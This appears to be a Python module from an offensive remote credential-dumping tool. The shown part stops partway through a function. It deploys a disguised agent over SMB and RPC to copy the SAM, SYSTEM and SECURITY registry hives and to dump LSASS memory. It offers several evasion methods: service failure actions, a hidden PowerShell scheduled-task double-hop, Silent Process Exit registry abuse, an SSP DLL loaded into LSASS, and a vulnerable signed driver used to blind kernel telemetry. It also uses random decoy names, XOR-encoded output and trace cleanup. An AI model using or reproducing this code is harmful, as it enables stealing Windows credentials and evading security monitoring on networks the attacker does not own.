"""Agent deployment and data retrieval.

Registry: reads hive files via raw NTFS disk reads (bypasses kernel locks).
First tries RegBack via SMB, then deploys native agent for raw volume access.
Zero registry API calls, zero shadow copies.

LSASS: uploads native agent, executes via Task Scheduler, receives minidump.
"""

import base64
import os
import secrets
import string
import struct
import time
import threading
from dataclasses import dataclass, field

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl, SERVICE_DEMAND_START, SERVICE_KERNEL_DRIVER
from ..rpc.tsch import TaskScheduler
from ..rpc.winreg import WinReg, REG_SZ, REG_BINARY, REG_EXPAND_SZ, REG_DWORD


AGENT_MAGIC_V3 = b'PYD\x03'


def _xor_cipher(data: bytes, key: str) -> bytes:
    kb = key.encode('ascii')
    klen = len(kb)
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ kb[i % klen]
    return bytes(out)


def random_name(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


_AGENT_NAMES = [
    "svcdiag.exe", "telhost.exe", "diagtrack.exe", "wshelper.exe",
    "netprofsvc.exe", "credprov.exe", "tokensvc.exe",
]

_OUTPUT_PREFIXES = [
    "perfdiag_", "winsat_", "cbscore_", "setupact_", "wuaueng_",
    "dfsvc_", "tskmgr_",
]

_TASK_PATHS = [
    "\\Microsoft\\Windows\\Maintenance\\",
    "\\Microsoft\\Windows\\Servicing\\",
    "\\Microsoft\\Windows\\NetTrace\\",
    "\\Microsoft\\Windows\\DeviceSetup\\",
]

_SERVICE_NAMES = [
    "WdiSystemHostSvc", "DiagTrackEvtLog", "UsoCoreMaint",
    "WinHttpAutoSvc", "NetSetupHostSvc", "CertPropWorker",
]


@dataclass
class AgentResult:
    """Structured output."""
    system_hive: bytes = b""
    sam_hive: bytes = b""
    security_hive: bytes = b""
    lsass_dump: bytes = b""


class PipeDump:
    """Extract credentials via raw NTFS hive reads and LSASS agent.

    Registry hives are read via raw NTFS disk access (bypasses kernel locks
    and file system filters). LSASS dump uses indirect syscalls.
    """

    def __init__(self, session: SmbSession, agent_path: str):
        self.session = session
        self.agent_path = agent_path
        self._has_agent = os.path.isfile(agent_path) if agent_path else False

    def execute(self, do_registry: bool = True,
                lsass_pid: int = 0,
                lsass_method: str = "scm") -> AgentResult:
        result = AgentResult()

        need_agent_hives = False
        if do_registry:
            if not self._try_regback(result):
                need_agent_hives = True

        need_agent = need_agent_hives or lsass_pid > 0
        if need_agent:
            if not self._has_agent:
                if lsass_pid > 0:
                    raise RuntimeError(
                        "Agent binary not found (required for LSASS)")
                print("[-] Agent not available for hive file read")
                return result

            if need_agent_hives and lsass_pid > 0:
                print("[*] Deploying agent for hive + LSASS...")
                self._run_agent(4, 0, result)
                self._dispatch_lsass(lsass_method, lsass_pid, result)
            elif need_agent_hives:
                print("[*] Deploying agent for hive file read...")
                self._run_agent(4, 0, result)
            elif lsass_pid > 0:
                self._dispatch_lsass(lsass_method, lsass_pid, result)

        return result

    def _dispatch_lsass(self, method: str, pid: int,
                        result: AgentResult) -> None:
        dispatch = {
            "scm": self._run_agent_delayed,
            "reghijack": self._run_agent_registry_hijack,
            "ifeo": self._run_agent_ifeo,
            "timed": self._run_agent_timed_task,
            "spe": self._run_agent_spe,
            "ssp": self._run_agent_ssp,
            "byovd": self._run_agent_byovd,
        }
        fn = dispatch.get(method)
        if not fn:
            raise ValueError(f"Unknown LSASS method: {method}")
        print(f"[*] LSASS method: {method}")
        fn(2, pid, result)

    def find_lsass_pid(self) -> int:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    # ── Registry via RegBack (preferred, zero risk) ──────────

    def _try_regback(self, result: AgentResult) -> bool:
        regback = "System32\\config\\RegBack"
        system_data = self._try_read_file(f"{regback}\\SYSTEM")
        if not system_data or len(system_data) < 4096:
            return False

        sam_data = self._try_read_file(f"{regback}\\SAM")
        security_data = self._try_read_file(f"{regback}\\SECURITY")

        if not sam_data or len(sam_data) < 1024:
            return False

        result.system_hive = system_data
        result.sam_hive = sam_data
        result.security_hive = security_data or b""
        print(f"[+] Registry backups (RegBack): "
              f"SYSTEM={len(system_data)} SAM={len(sam_data)} "
              f"SECURITY={len(security_data or b'')} bytes")
        return True

    # ── Agent-based extraction ──────────────────────────────

    def _run_agent(self, mode: int, pid: int,
                   result: AgentResult) -> None:
        """Deploy agent and parse its output.

        mode & 4 = read hive files (NtCreateFile + NtReadFile)
        mode & 2 = LSASS minidump
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        task_path = secrets.choice(_TASK_PATHS) + random_name(8)

        self._upload_agent(agent_name)
        cmd = f"C:\\Windows\\Temp\\{agent_name}"
        args = f"{mode} {pid} {output_name}"

        t = threading.Thread(target=self._exec_via_task,
                             args=(task_path, cmd, args), daemon=True)
        t.start()

        try:
            raw = self._read_output_file(output_name, timeout=180)
        finally:
            t.join(timeout=10)
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp",
                         f"c{output_name}.dat", f"c{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4

        # Registry section: 3 length-prefixed hive blobs
        _NTFS_ERRORS = {
            1: "boot sector read failed",
            2: "not NTFS",
            3: "MFT map build failed",
            4: "MFT entry too large",
            10: "root MFT read failed",
            11: "Windows MFT read failed",
            12: "System32 MFT read failed",
            13: "config MFT read failed",
            20: "root dir: name not found",
            21: "Windows not found",
            22: "System32 not found",
            23: "config not found",
            30: "file MFT read failed",
            31: "file data read zero",
        }
        hive_names = {"system_hive": "SYSTEM",
                      "sam_hive": "SAM",
                      "security_hive": "SECURITY"}
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen >= 0xFFFF0000:
                err_code = hlen & 0xFFFF
                desc = _NTFS_ERRORS.get(err_code, f"unknown ({err_code})")
                print(f"    {hive_names[attr]}: NTFS err {err_code} — {desc}")
            elif hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                print(f"    {hive_names[attr]}: {hlen} bytes")
                offset += hlen
            elif mode & 4:
                print(f"    {hive_names[attr]}: open failed")

        # LSASS section
        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif len(lsass_data) >= 8:
                marker = struct.unpack_from("<I", lsass_data, 0)[0]
                _SPAWN_ERRORS = {
                    0xDEAD0001: "RtlCreateProcessParametersEx",
                    0xDEAD0002: "NtCreateUserProcess",
                    0xDEAD0003: "child output file not found",
                    0xDEAD0004: "no parent process found",
                }
                if marker == 0xDEAD0005 and len(lsass_data) >= 8:
                    bits = struct.unpack_from("<I", lsass_data, 4)[0]
                    _FUNCS = {1: "NtCreateUserProcess", 2: "NtWaitForSingleObject",
                              4: "RtlCreateProcessParametersEx", 8: "RtlDestroyProcessParameters"}
                    missing = [n for b, n in _FUNCS.items() if bits & b]
                    print(f"    LSASS spawn: resolve failed: {', '.join(missing)}")
                elif marker in _SPAWN_ERRORS:
                    desc = _SPAWN_ERRORS[marker]
                    if marker == 0xDEAD0002 and len(lsass_data) >= 12:
                        sc = struct.unpack_from("<I", lsass_data, 4)[0]
                        ppid = struct.unpack_from("<I", lsass_data, 8)[0]
                        print(f"    LSASS spawn: {desc} (st=0x{sc:08X} parent_pid={ppid})")
                    elif len(lsass_data) >= 8:
                        sc = struct.unpack_from("<I", lsass_data, 4)[0]
                        print(f"    LSASS spawn: {desc} (0x{sc:08X})")
                    else:
                        print(f"    LSASS spawn: {desc}")
                else:
                    print(f"    LSASS debug: {len(lsass_data)} bytes, marker=0x{marker:08X}")
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: {lsass_data.hex()}")
            else:
                print(f"    LSASS debug: empty section (total={len(data)}, offset={offset})")

    def _run_agent_delayed(self, mode: int, pid: int,
                           result: AgentResult) -> None:
        """LSASS dump via SCM failure action with service protocol.

        1. Create service with binPath = agent.exe 16 0 svc (service stub)
        2. Set failure action = SC_ACTION_RUN_COMMAND with full dump cmd
        3. Start service → agent registers as service, reaches RUNNING,
           then exits with error code 1
        4. SCM detects crash → runs failure command
        5. Failure command process is created by services.exe (LOCAL)
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        svc_name = secrets.choice(_SERVICE_NAMES) + random_name(4)

        self._upload_agent(agent_name)

        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        svc_bin = f"{agent_path} 16 0 svc"
        failure_cmd = f"{agent_path} {mode} {pid} {output_name}"

        print(f"    [dbg] creating service {svc_name}")
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(svc_name, svc_name,
                                            svc_bin)
            print("    [dbg] setting failure actions")
            svc.set_failure_actions(svc_handle, failure_cmd)
            svc.set_failure_actions_flag(svc_handle, enabled=True)
            print("    [dbg] starting service")
            try:
                svc.start_service(svc_handle)
            except Exception as e:
                print(f"    [dbg] start_service: {e}")
            svc.close_handle(svc_handle)

        print("    [dbg] waiting for failure action")
        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            marker = self._try_read_file("Temp\\_svcrun.tmp")
            if marker is not None:
                print("    [dbg] service reached RUNNING (marker found)")
            else:
                print("    [dbg] service did NOT reach RUNNING")
            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
            if tmp:
                print(f"    [dbg] .tmp exists ({len(tmp)} bytes) "
                      "— agent ran but didn't finish")
                time.sleep(10)
                tmp2 = self._try_read_file(f"Temp\\{output_name}.tmp")
                if tmp2 and len(tmp2) > len(tmp):
                    print(f"    [dbg] .tmp growing: {len(tmp2)} bytes")
                elif tmp2:
                    print(f"    [dbg] .tmp stopped at {len(tmp2)} bytes "
                          "— agent killed")
            raise
        finally:
            self._delete_service(svc_name)
            for name in (agent_name, "_svcrun.tmp",
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4

        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section "
                      f"(total={len(data)}, offset={offset})")

    # ── Timed task: RegistrationTrigger, no SchRpcRun ────────

    def _run_agent_timed_task(self, mode: int, pid: int,
                              result: AgentResult) -> None:
        """LSASS dump via double-hop with local binary write.

        1. SMB: write .ps1 containing agent binary as base64
        2. Remote TSCH → PowerShell runs .ps1
        3. .ps1 decodes agent, writes it locally (not via SMB)
        4. .ps1 registers a LOCAL scheduled task (Register-ScheduledTask)
        5. Local task fires → agent runs from locally-written binary
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        outer_task = secrets.choice(_TASK_PATHS) + random_name(8)
        inner_name = "Rundown" + random_name(6)
        inner_task = "\\Microsoft\\Windows\\Maintenance\\" + inner_name
        ps_name = random_name(10) + ".ps1"

        with open(self.agent_path, "rb") as f:
            agent_b64 = base64.b64encode(f.read()).decode()

        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        agent_args = f"{mode} {pid} {output_name}"

        ps_script = (
            f"$b = [Convert]::FromBase64String('{agent_b64}')\n"
            f"[IO.File]::WriteAllBytes('{agent_path}', $b)\n"
            f"$a = New-ScheduledTaskAction "
            f"-Execute '{agent_path}' "
            f"-Argument '{agent_args}'\n"
            f"$t = New-ScheduledTaskTrigger -Once "
            f"-At (Get-Date).AddSeconds(2)\n"
            f"$s = New-ScheduledTaskSettingsSet "
            f"-AllowStartIfOnBatteries "
            f"-DontStopIfGoingOnBatteries "
            f"-StartWhenAvailable\n"
            f"Register-ScheduledTask "
            f"-TaskName '\\Microsoft\\Windows\\Maintenance\\{inner_name}' "
            f"-Action $a -Trigger $t -Settings $s "
            f"-User '{self.session.username}' "
            f"-Password '{self.session.password}' "
            f"-RunLevel Highest -Force\n"
            f"Remove-Item $MyInvocation.MyCommand.Path -Force\n"
        )
        self._write_remote_file(ps_name, ps_script.encode("utf-8"))
        ps_path = f"C:\\Windows\\Temp\\{ps_name}"

        cmd = ("C:\\Windows\\System32\\WindowsPowerShell"
               "\\v1.0\\powershell.exe")
        args = (f"-ExecutionPolicy Bypass -WindowStyle Hidden "
                f"-File {ps_path}")

        print("    [dbg] registering outer task (5s delay, "
              "local-write + Register-ScheduledTask)")
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task_delayed(outer_task, cmd, args, delay=5)

        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
            if tmp:
                print(f"    [dbg] .tmp exists ({len(tmp)} bytes) "
                      "— agent ran but didn't finish")
            else:
                print("    [dbg] no .tmp — agent may not have started")
            raise
        finally:
            self._cleanup_task(outer_task)
            self._cleanup_task(inner_task)
            for name in (agent_name, ps_name,
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section "
                      f"(total={len(data)}, offset={offset})")

    # ── Silent Process Exit: WerFault dumps LSASS ────────────

    def _run_agent_spe(self, mode: int, pid: int,
                       result: AgentResult) -> None:
        """LSASS dump via Silent Process Exit (zero NtReadVirtualMemory).

        1. Set IFEO GlobalFlag + SilentProcessExit registry keys via WinReg
        2. Agent opens LSASS with PROCESS_QUERY_INFORMATION only
        3. Agent calls RtlReportSilentProcessExit → WerFault creates dump
        4. Read the WerFault dump file via SMB
        5. Clean up registry keys and dump file
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        task_path = secrets.choice(_TASK_PATHS) + random_name(8)

        ifeo_path = ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
                     "Image File Execution Options")
        spe_base = ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
                    "SilentProcessExit")
        dump_folder = "C:\\Windows\\Temp"

        self._ensure_remote_registry()

        orig_global_flag = None
        spe_key_created = False

        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()

                ifeo_key = reg.open_key_write(hklm, ifeo_path)
                lsass_ifeo = reg.create_key(ifeo_key, "lsass.exe")
                try:
                    _, raw = reg.query_value(lsass_ifeo, "GlobalFlag")
                    orig_global_flag = raw
                except Exception:
                    pass
                reg.set_value(lsass_ifeo, "GlobalFlag", REG_DWORD,
                              struct.pack("<I", 0x200))
                reg.close_key(lsass_ifeo)
                reg.close_key(ifeo_key)

                spe_parent = reg.open_key_write(hklm, spe_base.rsplit("\\", 1)[0])
                try:
                    spe_key = reg.create_key(spe_parent, "SilentProcessExit")
                except Exception:
                    spe_key = reg.open_key_write(spe_parent, "SilentProcessExit")
                lsass_spe = reg.create_key(spe_key, "lsass.exe")
                spe_key_created = True

                reg.set_value(lsass_spe, "ReportingMode", REG_DWORD,
                              struct.pack("<I", 2))
                reg.set_value(lsass_spe, "LocalDumpFolder", REG_SZ,
                              (dump_folder + "\x00").encode("utf-16-le"))
                reg.set_value(lsass_spe, "DumpType", REG_DWORD,
                              struct.pack("<I", 2))

                reg.close_key(lsass_spe)
                reg.close_key(spe_key)
                reg.close_key(spe_parent)
                reg.close_key(hklm)
                print("    [dbg] IFEO + SilentProcessExit keys set")
        except Exception as e:
            print(f"    [!] Registry setup failed: {e}")
            self._run_agent_delayed(mode, pid, result)
            return

        self._upload_agent(agent_name)
        cmd = f"C:\\Windows\\Temp\\{agent_name}"
        args = f"64 {pid} {output_name}"

        t = threading.Thread(target=self._exec_via_task,
                             args=(task_path, cmd, args), daemon=True)
        t.start()

        spe_ok = False
        try:
            raw = self._read_output_file(output_name, timeout=60)
            data = _xor_cipher(raw, output_name)
            if len(data) >= 20 and data[:4] == AGENT_MAGIC_V3:
                spe_status = struct.unpack_from("<I", data, 16)[0]
                if spe_status == 0:
                    print("    [dbg] RtlReportSilentProcessExit: OK")
                    spe_ok = True
                else:
                    print(f"    [dbg] RtlReportSilentProcessExit: "
                          f"0x{spe_status:08X}")
            else:
                print(f"    [dbg] unexpected agent output: "
                      f"{len(data)} bytes")
        except RuntimeError:
            print("    [!] Agent timeout (SPE trigger)")
        finally:
            t.join(timeout=10)
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        if spe_ok:
            print("    [dbg] waiting for WerFault dump...")
            dump_data = self._find_werfault_dump(pid, timeout=60)
            if dump_data:
                result.lsass_dump = dump_data
                print(f"    [+] WerFault dump: {len(dump_data)} bytes")
            else:
                print("    [!] WerFault dump not found")

        self._cleanup_spe_registry(ifeo_path, spe_base,
                                   orig_global_flag, spe_key_created)

    def _find_werfault_dump(self, pid: int, timeout: int = 60) -> bytes | None:
        """Poll for WerFault dump file at known paths."""
        patterns = [
            f"Temp\\lsass.exe({pid})\\lsass.DMP",
            f"Temp\\lsass.exe({pid})\\lsass.exe.{pid}.dmp",
            f"Temp\\lsass.exe({pid})\\dump.dmp",
            f"Temp\\lsass.exe-{pid}-1.dmp",
            f"Temp\\lsass.exe-{pid}-1\\lsass.DMP",
        ]
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            for p in patterns:
                data = self._try_read_file(p)
                if data and len(data) > 100 and data[:4] == b"MDMP":
                    parent = p.rsplit("\\", 1)[0]
                    try:
                        self.session.delete_file("ADMIN$", p)
                    except Exception:
                        pass
                    return data
            time.sleep(3)
        return None

    def _cleanup_spe_registry(self, ifeo_path: str, spe_base: str,
                              orig_global_flag: bytes | None,
                              spe_key_created: bool) -> None:
        """Remove IFEO GlobalFlag and SilentProcessExit keys."""
        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()

                try:
                    ifeo_key = reg.open_key_write(hklm, ifeo_path)
                    lsass_ifeo = reg.open_key_write(ifeo_key, "lsass.exe")
                    if orig_global_flag:
                        reg.set_value(lsass_ifeo, "GlobalFlag", REG_DWORD,
                                      orig_global_flag)
                    else:
                        try:
                            reg.delete_value(lsass_ifeo, "GlobalFlag")
                        except Exception:
                            pass
                    reg.close_key(lsass_ifeo)
                    reg.close_key(ifeo_key)
                except Exception:
                    pass

                if spe_key_created:
                    try:
                        spe_parent = reg.open_key_write(
                            hklm, spe_base.rsplit("\\", 1)[0])
                        spe_key = reg.open_key_write(
                            spe_parent, "SilentProcessExit")
                        lsass_spe = reg.open_key_write(
                            spe_key, "lsass.exe")
                        for v in ("ReportingMode", "LocalDumpFolder",
                                  "DumpType"):
                            try:
                                reg.delete_value(lsass_spe, v)
                            except Exception:
                                pass
                        reg.close_key(lsass_spe)
                        try:
                            reg.delete_key(spe_key, "lsass.exe")
                        except Exception:
                            pass
                        reg.close_key(spe_key)
                        try:
                            reg.delete_key(spe_parent, "SilentProcessExit")
                        except Exception:
                            pass
                        reg.close_key(spe_parent)
                    except Exception:
                        pass

                reg.close_key(hklm)
                print("    [dbg] SPE registry keys cleaned up")
        except Exception as e:
            print(f"    [!] SPE registry cleanup failed: {e}")

    # ── SSP DLL: in-process LSASS extraction ──────────────────

    def _run_agent_ssp(self, mode: int, pid: int,
                       result: AgentResult) -> None:
        """LSASS dump via SSP DLL injection — zero ETW-Ti events.

        1. Upload SSP DLL to C:\\Windows\\Temp\\s_<output_name>.dll
        2. Deploy agent (mode 128) via SCM failure action
        3. Agent calls AddSecurityPackageW → LSASS loads SSP DLL
        4. SSP DLL reads credentials locally (no NtReadVirtualMemory)
        5. SSP writes MDMP to s_<output_name>.dat
        6. Agent reads MDMP, relays via pipe
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        svc_name = secrets.choice(_SERVICE_NAMES) + random_name(4)
        ssp_name = "s_" + output_name

        ssp_path = os.path.join(os.path.dirname(os.path.dirname(
            os.path.dirname(__file__))), "agent", "bin", "ssp.dll")
        if not os.path.isfile(ssp_path):
            print(f"    [!] SSP DLL not found: {ssp_path}")
            print("        Build with: cd agent && make cross_ssp")
            return

        with open(ssp_path, "rb") as f:
            ssp_data = f.read()
        self._write_remote_file(f"{ssp_name}.dll", ssp_data)
        print(f"    [dbg] SSP DLL uploaded ({len(ssp_data)} bytes)")

        self._upload_agent(agent_name)

        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        ssp_dll_remote = f"C:\\Windows\\Temp\\{ssp_name}.dll"
        svc_bin = f"{agent_path} 16 0 svc"
        failure_cmd = (f"cmd.exe /c rundll32.exe {ssp_dll_remote},Install "
                       f"& {agent_path} 128 0 {output_name}")

        print(f"    [dbg] creating service {svc_name}")
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(svc_name, svc_name, svc_bin)
            svc.set_failure_actions(svc_handle, failure_cmd)
            svc.set_failure_actions_flag(svc_handle, enabled=True)
            print("    [dbg] starting service (SSP via rundll32)")
            try:
                svc.start_service(svc_handle)
            except Exception as e:
                print(f"    [dbg] start_service: {e}")
            svc.close_handle(svc_handle)

        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            marker = self._try_read_file("Temp\\_svcrun.tmp")
            if marker is not None:
                print("    [dbg] service reached RUNNING (marker found)")
            else:
                print("    [dbg] service did NOT reach RUNNING")
            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
            if tmp:
                print(f"    [dbg] .tmp exists ({len(tmp)} bytes)")
            raise
        finally:
            self._delete_service(svc_name)
            for name in (agent_name, "_svcrun.tmp",
                         f"{output_name}.dat", f"{output_name}.tmp",
                         f"{ssp_name}.dll", f"{ssp_name}.dat"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        lsass_data = data[offset:]
        if lsass_data and lsass_data[:4] == b"MDMP":
            result.lsass_dump = lsass_data
        elif lsass_data:
            print(f"    LSASS debug: {len(lsass_data)} bytes: "
                  f"{lsass_data[:32].hex()}")
        else:
            print(f"    LSASS debug: empty section "
                  f"(total={len(data)}, offset={offset})")

    # ── BYOVD: kernel driver + ETW-Ti disable ─────────────────

    _DRIVER_NAMES = [
        "rtcmon.sys", "hwmon.sys", "biosio.sys", "pciutil.sys",
        "dmiutil.sys", "acpimon.sys", "hwdiag.sys",
    ]

    _DRIVER_SVC_NAMES = [
        "RTCMonitor", "HWMonSvc", "BIOSIntf", "PCIDiag",
        "DMIHelper", "ACPIMon", "HWDiagSvc",
    ]

    def _find_driver_binary(self) -> str | None:
        """Find a BYOVD driver binary in agent/drivers/."""
        drivers_dir = os.path.join(os.path.dirname(os.path.dirname(
            os.path.dirname(__file__))), "agent", "drivers")
        candidates = [
            "KKYUM.sys", "signeddrv.sys",
            "RTCore64.sys", "DBUtil_2_3.sys",
            "rtcore64.sys", "dbutil_2_3.sys",
        ]
        for name in candidates:
            p = os.path.join(drivers_dir, name)
            if os.path.isfile(p):
                return p
        for f in os.listdir(drivers_dir) if os.path.isdir(drivers_dir) else []:
            if f.lower().endswith(".sys"):
                return os.path.join(drivers_dir, f)
        return None

    def _run_agent_byovd(self, mode: int, pid: int,
                         result: AgentResult) -> None:
        """LSASS dump with BYOVD ETW-Ti bypass.

        1. Upload vulnerable driver + agent
        2. Create and start kernel driver service
        3. Agent opens driver device, zeros EtwThreatIntProvRegHandle
        4. Agent dumps LSASS (NtReadVirtualMemory without ETW-Ti)
        5. Agent restores handle, closes driver
        6. Clean up driver service and files
        """
        driver_path = self._find_driver_binary()
        if not driver_path:
            print("    [!] No driver binary found in agent/drivers/")
            print("        Place RTCore64.sys or DBUtil_2_3.sys there")
            print("    [!] Falling back to SCM (will generate 1 alert)")
            self._run_agent_delayed(mode, pid, result)
            return

        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        svc_name = secrets.choice(_SERVICE_NAMES) + random_name(4)
        drv_remote_name = secrets.choice(self._DRIVER_NAMES)
        drv_svc_name = secrets.choice(self._DRIVER_SVC_NAMES) + random_name(3)

        with open(driver_path, "rb") as f:
            drv_data = bytearray(f.read())
        if len(drv_data) > 0x124 and drv_data[0] == 0x4D and drv_data[1] == 0x5A:
            pe_off = struct.unpack_from("<I", drv_data, 0x3c)[0]
            csum_off = pe_off + 24 + 0x40
            if csum_off + 4 <= len(drv_data):
                rnd = secrets.token_bytes(4)
                drv_data[csum_off:csum_off + 4] = rnd
        drv_data = bytes(drv_data)
        drv_uploaded = False
        try:
            self._write_remote_driver(drv_remote_name, drv_data)
            drv_uploaded = True
            print(f"    [dbg] driver uploaded: {os.path.basename(driver_path)} "
                  f"as {drv_remote_name} ({len(drv_data)} bytes)")
        except Exception as e:
            if "SHARING_VIOLATION" in str(e) or "0xc0000043" in str(e):
                print(f"    [dbg] driver file locked (already loaded in kernel)")
            else:
                raise

        if drv_uploaded:
            check = self._try_read_file(f"System32\\drivers\\{drv_remote_name}")
            if not check or len(check) != len(drv_data):
                print("    [!] driver file quarantined or missing after upload")
                print("    [!] Falling back to SCM (will generate 1 alert)")
                self._run_agent_delayed(mode, pid, result)
                return

        self._upload_agent(agent_name)

        drv_bin_path = f"C:\\Windows\\System32\\drivers\\{drv_remote_name}"
        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        byovd_mode = mode | 256
        svc_bin = f"{agent_path} 16 0 svc"
        failure_cmd = f"{agent_path} {byovd_mode} {pid} {output_name}"

        drv_started = False
        drv_already = False
        if drv_uploaded:
            try:
                with self.session.open_pipe("svcctl") as pipe:
                    svc = SvcCtl(pipe)
                    svc.bind()
                    svc.open_sc_manager()
                    drv_h = svc.create_service(drv_svc_name, drv_svc_name,
                                               drv_bin_path,
                                               svc_type=SERVICE_KERNEL_DRIVER)
                    print(f"    [dbg] driver service {drv_svc_name} created")
                    try:
                        svc.start_service(drv_h)
                        drv_started = True
                        print("    [dbg] driver loaded")
                    except RuntimeError as e:
                        err_msg = str(e)
                        if "0x000000B7" in err_msg or "0x00000420" in err_msg:
                            drv_already = True
                            print("    [dbg] driver device already present")
                        else:
                            print(f"    [!] driver load failed: {e}")
                    svc.close_handle(drv_h)
            except Exception as e:
                print(f"    [!] driver service creation failed: {e}")
        else:
            drv_already = True

        if not drv_started and not drv_already:
            print("    [!] Falling back to SCM (will generate 1 alert)")
            self._delete_service(drv_svc_name)
            try:
                self.session.delete_file("ADMIN$",
                                         f"System32\\drivers\\{drv_remote_name}")
            except Exception:
                pass
            self._run_agent_delayed(mode, pid, result)
            return

        print(f"    [dbg] creating agent service {svc_name}")
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(svc_name, svc_name, svc_bin)
            svc.set_failure_actions(svc_handle, failure_cmd)
            svc.set_failure_actions_flag(svc_handle, enabled=True)
            print("    [dbg] starting agent (BYOVD mode)")
            try:
                svc.start_service(svc_handle)
            except Exception as e:
                print(f"    [dbg] start_service: {e}")
            svc.close_handle(svc_handle)

        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            marker = self._try_read_file("Temp\\_svcrun.tmp")
            if marker is not None:
